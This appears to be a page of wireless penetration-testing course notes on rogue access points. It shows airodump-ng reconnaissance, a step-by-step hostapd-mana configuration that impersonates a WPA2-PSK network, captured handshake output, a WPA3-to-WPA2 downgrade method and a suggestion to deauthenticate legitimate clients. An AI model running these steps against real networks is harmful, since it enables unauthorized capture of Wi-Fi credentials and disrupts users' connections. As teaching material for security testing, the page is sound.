---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 10: Rogue Access Points

## The Basics of Rogue APs

_Use a Rogue AP with an identical SSID to have a device reference its Preferred Network List (PNL) and try to connect to your AP with the legitimate PSK._

## Discovery

_Conduct recon to gather information about the AP you'll be maliciously mirroring._

```bash
kali@kali:~$ sudo airodump-ng -w discovery --output-format pcap wlan0mon
 CH 12 ][ Elapsed: 0 s ][ 2020-08-14 16:23 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 CD:C2:25:9A:47:BA  -45        3        2    0   6  195   WPA2 CCMP   MGT  Sarajevo
 94:36:45:CA:71:61  -46        3        4    0   6  195   WPA2 CCMP   PSK  Zagreb
 FC:7A:2B:88:63:EF  -53        5        0    0   1  130   WPA2 CCMP   PSK  Mostar
 1E:E1:3E:95:52:7D  -87        2        0    0  11  130   OPN              Budva
 85:28:13:AE:50:5C  -91        3        0    0  11  130   WPA2 CCMP   PSK  Beograd

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 94:36:45:CA:71:61  E6:D9:90:B0:B2:4C  -54    0 - 0e     0        2
 94:36:45:CA:71:61  05:E3:5B:E6:D9:A4  -73    0e-54      0        2
 85:28:13:AE:50:5C  E6:DE:B9:2A:56:83  -91    0 - 5e   487        6
 CD:C2:25:9A:47:BA  98:D5:95:6D:25:77  -37    0 - 1e     0        2
 (not associated)   A7:AD:4A:2B:5E:ED  -54    0 - 1      3        9         Yugoslavia
 FC:7A:2B:88:63:EF  FE:5C:F4:2B:D4:3E  -48    0 - 6      0        1
```

_The above example lets us know Mostar is a WPA2-PSK network with CCMP. It runs at 130 Mbit, and is on channel 1._

## Creating a Rogue AP

### Building the hostapd-mana Configuration

The simplest configuration for hsotapd-mana:

```bash
kali@kali:~$ cat Mostar-mana.conf
interface=wlan0
ssid=Mostar
channel=1
```

Adding hw\_mode to the config file:

```bash
kali@kali:~$ cat Mostar-mana.conf
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
```

Adding security configuration:

```bash
kali@kali:~$ cat Mostar-mana.conf
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
```

Final Mostar-mana.conf:

```bash
kali@kali:~$ cat Mostar-mana.conf
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/mostar.hccapx
```

{% hint style="info" %}
At the writing of this module, it is not possible to crack WPA3. However, when we encounter APs with WPA3, we may be able to trick clients into downgrading to a WPA2 connection, allowing us to capture a crackable handshake. We can accomplish this by creating an AP with only WPA2 and 802.11w set to "optional". WPA3 use the same algorithms as WPA2 CCMP, and requires 802.11w.

If 802.11w is disabled, a client may never try to connect, but WPA2 clients rarely use it (and sometimes don't handle it well). The combination of only using WPA2 and 802.11w set to "optional" will gives us the highest chance that a client will be willing to downgrade.

To achieve this in the hostapd configuration, the _wpa_ value should be set to "2", there shouldn't be a _wpa\_pairwise_ parameter, and _rsn\_pairwise_ should be set to "CCMP" only. To enable 802.11w, we would set _ieee80211w_ as a new parameter with the value of "1" (indicating it is optional). This also requires that we add "WPA-PSK-SHA256" to _wpa\_key\_mgmt_.
{% endhint %}

### Capturing Handshakes

Starting hostapd-mana to capture handshakes:

```bash
kali@kali:~$ sudo hostapd-mana Mostar-mana.conf 
Configuration file: Mostar-mana.conf
MANA: Captured WPA/2 handshakes will be written to file 'mostar.hccapx'.
Using interface wlan0 with hwaddr 2e:0b:05:98:f8:66 and ssid "Mostar"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED 
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
```

To _help_ client devices connect to your rogue AP, consider sending deauths to the legitimate AP's clients.
